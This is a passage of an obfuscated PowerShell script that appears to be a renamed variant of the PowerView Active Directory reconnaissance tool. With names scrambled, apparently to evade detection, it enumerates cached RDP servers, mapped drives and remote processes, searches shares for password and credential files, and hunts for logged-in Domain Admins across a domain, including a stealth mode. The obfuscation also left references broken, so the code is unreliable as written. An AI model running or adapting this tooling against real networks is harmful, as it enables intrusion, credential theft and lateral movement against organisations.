        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $HKU = 2147483651
            $oeuhoiCr99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $YaYHUvEO99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $oeuhoiCr99['Credential'] = $DegNROrc99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $LICTcGsU99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($vidWbVGU99 in $LICTcGsU99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $XOIvwKgj99 = chews -GTVZZPBV99 $vidWbVGU99 -DegNROrc99 $DegNROrc99
                        }
                        else {
                            $XOIvwKgj99 = chews -GTVZZPBV99 $vidWbVGU99
                        }
                        $ZrEwVRih99 = $Reg.EnumValues($HKU,"$vidWbVGU99\Software\Microsoft\Terminal Server Client\Default").sNames
                        ForEach ($tVAmGwRv99 in $ZrEwVRih99) {
                            if ($tVAmGwRv99 -match 'MRU.*') {
                                $UlQjQMQk99 = $Reg.GetStringValue($HKU, "$vidWbVGU99\Software\Microsoft\Terminal Server Client\Default", $tVAmGwRv99).sValue
                                $gpmzcVvG99 = New-Object PSObject
                                $gpmzcVvG99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                                $gpmzcVvG99 | Add-Member Noteproperty 'UserName' $XOIvwKgj99
                                $gpmzcVvG99 | Add-Member Noteproperty 'UserSID' $vidWbVGU99
                                $gpmzcVvG99 | Add-Member Noteproperty 'TargetServer' $UlQjQMQk99
                                $gpmzcVvG99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $gpmzcVvG99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $gpmzcVvG99
                            }
                        }
                        $fiISrusc99 = $Reg.EnumKey($HKU,"$vidWbVGU99\Software\Microsoft\Terminal Server Client\Servers").sNames
                        ForEach ($sWbqYnBA99 in $fiISrusc99) {
                            $RaZrDWUH99 = $Reg.GetStringValue($HKU, "$vidWbVGU99\Software\Microsoft\Terminal Server Client\Servers\$sWbqYnBA99", 'UsernameHint').sValue
                            $gpmzcVvG99 = New-Object PSObject
                            $gpmzcVvG99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                            $gpmzcVvG99 | Add-Member Noteproperty 'UserName' $XOIvwKgj99
                            $gpmzcVvG99 | Add-Member Noteproperty 'UserSID' $vidWbVGU99
                            $gpmzcVvG99 | Add-Member Noteproperty 'TargetServer' $sWbqYnBA99
                            $gpmzcVvG99 | Add-Member Noteproperty 'UsernameHint' $RaZrDWUH99
                            $gpmzcVvG99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $gpmzcVvG99
                        }
                    }
                    catch {
                        Write-Verbose "[mousers] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[mousers] Error accessing $YaYHUvEO99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function posited {
    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            $HKU = 2147483651
            $oeuhoiCr99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $YaYHUvEO99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $oeuhoiCr99['Credential'] = $DegNROrc99 }
            try {
                $Reg = Get-WmiObject @WmiArguments
                $LICTcGsU99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
                ForEach ($vidWbVGU99 in $LICTcGsU99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $XOIvwKgj99 = chews -GTVZZPBV99 $vidWbVGU99 -DegNROrc99 $DegNROrc99
                        }
                        else {
                            $XOIvwKgj99 = chews -GTVZZPBV99 $vidWbVGU99
                        }
                        $qiqyoofL99 = ($Reg.EnumKey($HKU, "$vidWbVGU99\Network")).sNames
                        ForEach ($zDLljSFV99 in $qiqyoofL99) {
                            $dfUFmXYK99 = $Reg.GetStringValue($HKU, "$vidWbVGU99\Network\$zDLljSFV99", 'ProviderName').sValue
                            $xfXvwjdI99 = $Reg.GetStringValue($HKU, "$vidWbVGU99\Network\$zDLljSFV99", 'RemotePath').sValue
                            $HkyfXTSu99 = $Reg.GetStringValue($HKU, "$vidWbVGU99\Network\$zDLljSFV99", 'UserName').sValue
                            if (-not $XOIvwKgj99) { $XOIvwKgj99 = '' }
                            if ($xfXvwjdI99 -and ($xfXvwjdI99 -ne '')) {
                                $oMYbSwGN99 = New-Object PSObject
                                $oMYbSwGN99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                                $oMYbSwGN99 | Add-Member Noteproperty 'UserName' $XOIvwKgj99
                                $oMYbSwGN99 | Add-Member Noteproperty 'UserSID' $vidWbVGU99
                                $oMYbSwGN99 | Add-Member Noteproperty 'DriveLetter' $zDLljSFV99
                                $oMYbSwGN99 | Add-Member Noteproperty 'ProviderName' $dfUFmXYK99
                                $oMYbSwGN99 | Add-Member Noteproperty 'RemotePath' $xfXvwjdI99
                                $oMYbSwGN99 | Add-Member Noteproperty 'DriveUserName' $HkyfXTSu99
                                $oMYbSwGN99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $oMYbSwGN99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[posited] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[posited] Error accessing $YaYHUvEO99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}
function scullions {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $BoyAErDp99 = 'localhost',
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ForEach ($YaYHUvEO99 in $BoyAErDp99) {
            try {
                $oeuhoiCr99 = @{
                    'ComputerName' = $BoyAErDp99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $oeuhoiCr99['Credential'] = $DegNROrc99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $JMLDHLiW99 = New-Object PSObject
                    $JMLDHLiW99 | Add-Member Noteproperty 'ComputerName' $YaYHUvEO99
                    $JMLDHLiW99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $JMLDHLiW99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $JMLDHLiW99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $JMLDHLiW99 | Add-Member Noteproperty 'User' $Owner.User
                    $JMLDHLiW99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $JMLDHLiW99
                }
            }
            catch {
                Write-Verbose "[scullions] Error enumerating remote processes on '$YaYHUvEO99', access likely denied: $_"
            }
        }
    }
}
function Indira {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $qCecPaoL99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $SNftXGrU99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $GgTYlKye99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $rUwweuDO99,
        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $MaeaFmuB99,
        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $ChXzMeTA99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $PbSHAyrr99,
        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $dMQkXRKy99,
        [Switch]
        $pFxARMdl99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $cODXoeui99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $qCecPaoL99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $cODXoeui99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $SNftXGrU99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $cODXoeui99['Include'] = @('*.exe')
        }
        $cODXoeui99['Force'] = -not $PSBoundParameters['ExcludeHidden']
        $yOPPlUQQ99 = @{}
        function programme {
            [CmdletBinding()]Param([String]$Path)
            try {
                $GLNoPkFg99 = [IO.File]::OpenWrite($Path)
                $GLNoPkFg99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }
    PROCESS {
        ForEach ($kkUVHmBq99 in $Path) {
            if (($kkUVHmBq99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $WSnpkeEP99 = (New-Object System.Uri($kkUVHmBq99)).Host
                if (-not $yOPPlUQQ99[$WSnpkeEP99]) {
                    disservice -BoyAErDp99 $WSnpkeEP99 -DegNROrc99 $DegNROrc99
                    $yOPPlUQQ99[$WSnpkeEP99] = $True
                }
            }
            $cODXoeui99['Path'] = $kkUVHmBq99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $HvUQKiPD99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $HvUQKiPD99 = $False
                }
                if ($SNftXGrU99 -and ($_.LastAccessTime -lt $SNftXGrU99)) {
                    $HvUQKiPD99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $GgTYlKye99)) {
                    $HvUQKiPD99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $rUwweuDO99)) {
                    $HvUQKiPD99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (programme -Path $_.FullName))) {
                    $HvUQKiPD99 = $False
                }
                if ($HvUQKiPD99) {
                    $gIaNwxMv99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $PAJgNesX99 = New-Object -TypeName PSObject -Property $gIaNwxMv99
                    $PAJgNesX99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $PAJgNesX99
                }
            }
        }
    }
    END {
        $yOPPlUQQ99.Keys | moronic
    }
}
function spaced {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $BoyAErDp99,
        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $VmbuGSUi99,
        [Parameter(Position = 2)]
        [Hashtable]
        $TuoSIuWn99,
        [Int]
        [ValidateRange(1,  100)]
        $KYLUFgiv99 = 20,
        [Switch]
        $DJOfSNHx99
    )
    BEGIN {
        $VEZHSLUB99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $VEZHSLUB99.ApartmentState = [System.Threading.ApartmentState]::STA
        if (-not $DJOfSNHx99) {
            $meoJVJgj99 = Get-Variable -Scope 2
            $mjAeNwNX99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')
            ForEach ($Var in $meoJVJgj99) {
                if ($mjAeNwNX99 -NotContains $Var.Name) {
                $VEZHSLUB99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }
            ForEach ($lsyBuOeq99 in (Get-ChildItem Function:)) {
                $VEZHSLUB99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $lsyBuOeq99.Name, $lsyBuOeq99.Definition))
            }
        }
        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $KYLUFgiv99, $VEZHSLUB99, $Host)
        $Pool.Open()
        $vKlpkKQd99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $YuGFdXIW99 = $M.GetParameters()
            if (($YuGFdXIW99.Count -eq 2) -and $YuGFdXIW99[0].Name -eq 'input' -and $YuGFdXIW99[1].Name -eq 'output') {
                $vKlpkKQd99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }
        $Jobs = @()
        $BoyAErDp99 = $BoyAErDp99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[spaced] Total number of hosts: $($BoyAErDp99.count)"
        if ($KYLUFgiv99 -ge $BoyAErDp99.Length) {
            $KYLUFgiv99 = $BoyAErDp99.Length
        }
        $PIxuIKyr99 = [Int]($BoyAErDp99.Length/$KYLUFgiv99)
        $owyYBBSu99 = @()
        $Start = 0
        $End = $PIxuIKyr99
        for($i = 1; $i -le $KYLUFgiv99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $KYLUFgiv99) {
                $End = $BoyAErDp99.Length
            }
            $List.AddRange($BoyAErDp99[$Start..($End-1)])
            $Start += $PIxuIKyr99
            $End += $PIxuIKyr99
            $owyYBBSu99 += @(,@($List.ToArray()))
        }
        Write-Verbose "[spaced] Total number of threads/partitions: $KYLUFgiv99"
        ForEach ($dPvOqQko99 in $owyYBBSu99) {
            $NxxxWGHt99 = [PowerShell]::Create()
            $NxxxWGHt99.runspacepool = $Pool
            $Null = $NxxxWGHt99.AddScript($VmbuGSUi99).AddParameter('ComputerName', $dPvOqQko99)
            if ($TuoSIuWn99) {
                ForEach ($Param in $TuoSIuWn99.GetEnumerator()) {
                    $Null = $NxxxWGHt99.AddParameter($Param.Name, $Param.Value)
                }
            }
            $MhFNKxWo99 = New-Object Management.Automation.PSDataCollection[Object]
            $Jobs += @{
                PS = $NxxxWGHt99
                Output = $MhFNKxWo99
                Result = $vKlpkKQd99.Invoke($NxxxWGHt99, @($Null, [Management.Automation.PSDataCollection[Object]]$MhFNKxWo99))
            }
        }
    }
    END {
        Write-Verbose "[spaced] Threads executing"
        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)
        $qWrwfWSc99 = 100
        Write-Verbose "[spaced] Waiting $qWrwfWSc99 seconds for final cleanup..."
        for ($i=0; $i -lt $qWrwfWSc99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }
        $Pool.Dispose()
        Write-Verbose "[spaced] all threads completed"
    }
}
function steady {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $BoyAErDp99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [String]
        $SSKdjHHA99,
        [ValidateNotNullOrEmpty()]
        [String]
        $ALlpyaOL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $aHiEPZaB99,
        [Alias('Unconstrained')]
        [Switch]
        $MrWNSVjr99,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $rBGjwAAv99,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $iOERMkAn99,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $UntQDNuv99,
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $TYwqHZTv99,
        [ValidateNotNullOrEmpty()]
        [String]
        $GOrSdVAL99,
        [ValidateNotNullOrEmpty()]
        [String]
        $MaTIhOlk99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AAAbQCdQ99,
        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $ENIJvIUJ99 = 'Domain Admins',
        [Alias('AdminCount')]
        [Switch]
        $ZGzYZcEj99,
        [Alias('AllowDelegation')]
        [Switch]
        $Rqbtrxij99,
        [Switch]
        $oYrVhlip99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $wzKKlbLD99,
        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        $hFAFUxDJ99 = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $CCYYiJjn99,
        [Switch]
        $ndJGDUTZ99,
        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $VbIwgkKd99 = 'All',
        [Int]
        [ValidateRange(1, 100)]
        $KYLUFgiv99 = 20
    )
    BEGIN {
        $ZjqCBLnd99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ZjqCBLnd99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['ComputerDomain']) { $ZjqCBLnd99['Domain'] = $SSKdjHHA99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZjqCBLnd99['LDAPFilter'] = $ALlpyaOL99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZjqCBLnd99['SearchBase'] = $aHiEPZaB99 }
        if ($PSBoundParameters['Unconstrained']) { $ZjqCBLnd99['Unconstrained'] = $GNUthHex99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZjqCBLnd99['OperatingSystem'] = $MHzuHSVj99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZjqCBLnd99['ServicePack'] = $IooYAKOh99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZjqCBLnd99['SiteName'] = $AxVRNJsI99 }
        if ($PSBoundParameters['Server']) { $ZjqCBLnd99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $ZjqCBLnd99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZjqCBLnd99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZjqCBLnd99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $ZjqCBLnd99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $ZjqCBLnd99['Credential'] = $DegNROrc99 }
        $jRryQntp99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $jRryQntp99['Identity'] = $TYwqHZTv99 }
        if ($PSBoundParameters['Domain']) { $jRryQntp99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['UserDomain']) { $jRryQntp99['Domain'] = $GOrSdVAL99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $jRryQntp99['LDAPFilter'] = $MaTIhOlk99 }
        if ($PSBoundParameters['UserSearchBase']) { $jRryQntp99['SearchBase'] = $AAAbQCdQ99 }
        if ($PSBoundParameters['UserAdminCount']) { $jRryQntp99['AdminCount'] = $ZGzYZcEj99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $jRryQntp99['AllowDelegation'] = $Rqbtrxij99 }
        if ($PSBoundParameters['Server']) { $jRryQntp99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $jRryQntp99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $jRryQntp99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $jRryQntp99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $jRryQntp99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $jRryQntp99['Credential'] = $DegNROrc99 }
        $voVxECvy99 = @()
        if ($PSBoundParameters['ComputerName']) {
            $voVxECvy99 = @($BoyAErDp99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[steady] Stealth enumeration using source: $VbIwgkKd99"
                $ckQbLjYY99 = New-Object System.Collections.ArrayList
                if ($VbIwgkKd99 -match 'File|All') {
                    Write-Verbose '[steady] Querying for file servers'
                    $WMnVRqWn99 = @{}
                    if ($PSBoundParameters['Domain']) { $WMnVRqWn99['Domain'] = $StsWGohF99 }
                    if ($PSBoundParameters['ComputerDomain']) { $WMnVRqWn99['Domain'] = $SSKdjHHA99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $WMnVRqWn99['SearchBase'] = $aHiEPZaB99 }
                    if ($PSBoundParameters['Server']) { $WMnVRqWn99['Server'] = $sWbqYnBA99 }
                    if ($PSBoundParameters['SearchScope']) { $WMnVRqWn99['SearchScope'] = $hZznjEbB99 }
                    if ($PSBoundParameters['ResultPageSize']) { $WMnVRqWn99['ResultPageSize'] = $jrZpVEwq99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $WMnVRqWn99['ServerTimeLimit'] = $kkbrymyp99 }
                    if ($PSBoundParameters['Tombstone']) { $WMnVRqWn99['Tombstone'] = $YXMSPUCr99 }
                    if ($PSBoundParameters['Credential']) { $WMnVRqWn99['Credential'] = $DegNROrc99 }
                    $ArvLcTty99 = perhaps @FileServerSearcherArguments
                    if ($ArvLcTty99 -isnot [System.Array]) { $ArvLcTty99 = @($ArvLcTty99) }
                    $ckQbLjYY99.AddRange( $ArvLcTty99 )
                }
                if ($VbIwgkKd99 -match 'DFS|All') {
                    Write-Verbose '[steady] Querying for DFS servers'
                }
                if ($VbIwgkKd99 -match 'DC|All') {
                    Write-Verbose '[steady] Querying for domain controllers'
                    $VlrGIvqF99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $VlrGIvqF99['Domain'] = $StsWGohF99 }
                    if ($PSBoundParameters['ComputerDomain']) { $VlrGIvqF99['Domain'] = $SSKdjHHA99 }
                    if ($PSBoundParameters['Server']) { $VlrGIvqF99['Server'] = $sWbqYnBA99 }
                    if ($PSBoundParameters['Credential']) { $VlrGIvqF99['Credential'] = $DegNROrc99 }
                    $afmEhTJu99 = skyrockets @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($afmEhTJu99 -isnot [System.Array]) { $afmEhTJu99 = @($afmEhTJu99) }
                    $ckQbLjYY99.AddRange( $afmEhTJu99 )
                }
                $voVxECvy99 = $ckQbLjYY99.ToArray()
            }
            else {
                Write-Verbose '[steady] Querying for all computers in the domain'
                $voVxECvy99 = snivel @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[steady] TargetComputers length: $($voVxECvy99.Length)"
        if ($voVxECvy99.Length -eq 0) {
            throw '[steady] No hosts found to enumerate'
        }
        if ($PSBoundParameters['Credential']) {
            $vGVRQpiU99 = $DegNROrc99.GetNetworkCredential().UserName
        }
        else {
            $vGVRQpiU99 = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters['ShowAll']) {
            $BvlgFmiy99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $BvlgFmiy99 = Lille @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $RbykXVFu99 = @{
                'Identity' = $ENIJvIUJ99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $RbykXVFu99['Domain'] = $GOrSdVAL99 }
            if ($PSBoundParameters['UserSearchBase']) { $RbykXVFu99['SearchBase'] = $AAAbQCdQ99 }
            if ($PSBoundParameters['Server']) { $RbykXVFu99['Server'] = $sWbqYnBA99 }
            if ($PSBoundParameters['SearchScope']) { $RbykXVFu99['SearchScope'] = $hZznjEbB99 }
            if ($PSBoundParameters['ResultPageSize']) { $RbykXVFu99['ResultPageSize'] = $jrZpVEwq99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $RbykXVFu99['ServerTimeLimit'] = $kkbrymyp99 }
            if ($PSBoundParameters['Tombstone']) { $RbykXVFu99['Tombstone'] = $YXMSPUCr99 }
            if ($PSBoundParameters['Credential']) { $RbykXVFu99['Credential'] = $DegNROrc99 }
            $BvlgFmiy99 = Zaporozhye @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }
        Write-Verbose "[steady] TargetUsers length: $($BvlgFmiy99.Length)"
        if ((-not $CCYYiJjn99) -and ($BvlgFmiy99.Length -eq 0)) {
            throw '[steady] No users found to target'
        }
        $GQOwBNso99 = {
            Param($BoyAErDp99, $BvlgFmiy99, $vGVRQpiU99, $ndJGDUTZ99, $iJJxkpFW99)
            if ($iJJxkpFW99) {
                $Null = dizzied -iJJxkpFW99 $iJJxkpFW99 -Quiet
            }
            ForEach ($RrDltCuw99 in $BoyAErDp99) {
                $Up = Test-Connection -Count 1 -Quiet -BoyAErDp99 $RrDltCuw99
                if ($Up) {
                    $wDmDjOfE99 = Scotty -BoyAErDp99 $RrDltCuw99
                    ForEach ($qeIiTgYf99 in $wDmDjOfE99) {
                        $XOIvwKgj99 = $qeIiTgYf99.UserName
                        $CName = $qeIiTgYf99.CName
                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }
                        if (($XOIvwKgj99) -and ($XOIvwKgj99.Trim() -ne '') -and ($XOIvwKgj99 -notmatch $vGVRQpiU99) -and ($XOIvwKgj99 -notmatch '\$$')) {
                            if ( (-not $BvlgFmiy99) -or ($BvlgFmiy99 -contains $XOIvwKgj99)) {
                                $JVKbRRcM99 = New-Object PSObject
                                $JVKbRRcM99 | Add-Member Noteproperty 'UserDomain' $Null
                                $JVKbRRcM99 | Add-Member Noteproperty 'UserName' $XOIvwKgj99
                                $JVKbRRcM99 | Add-Member Noteproperty 'ComputerName' $RrDltCuw99
                                $JVKbRRcM99 | Add-Member Noteproperty 'SessionFrom' $CName
                                try {
                                    $aREqtkhR99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $JVKbRRcM99 | Add-Member NoteProperty 'SessionFromName' $aREqtkhR99
                                }
                                catch {
                                    $JVKbRRcM99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }
                                if ($oYrVhlip99) {
                                    $Admin = (runarounds -BoyAErDp99 $CName).IsAdmin
                                    $JVKbRRcM99 | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $JVKbRRcM99 | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $JVKbRRcM99.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $JVKbRRcM99
                            }
                        }
                    }
                    if (-not $ndJGDUTZ99) {
                        $RjSTVObl99 = Erna -BoyAErDp99 $RrDltCuw99
                        ForEach ($User in $RjSTVObl99) {
